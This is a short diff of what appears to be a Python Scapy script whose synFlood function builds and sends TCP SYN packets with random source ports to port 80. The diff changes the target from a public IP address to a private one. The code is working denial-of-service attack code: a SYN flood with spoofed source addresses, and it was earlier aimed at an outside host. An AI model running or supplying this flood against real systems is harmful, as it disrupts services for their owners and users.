@@ -12,7 +12,7 @@ def synFlood():
             )
         #构造随机的端口
         sport=random.randint(1024,65535)
-        IPlayer=IP(src=src,dst='8.140.182.127')
+        IPlayer=IP(src=src,dst='192.168.1.25')
         TCPlayer=TCP(sport=sport,dport=80,flags="S")
         packet=IPlayer/TCPlayer
         send(packet)
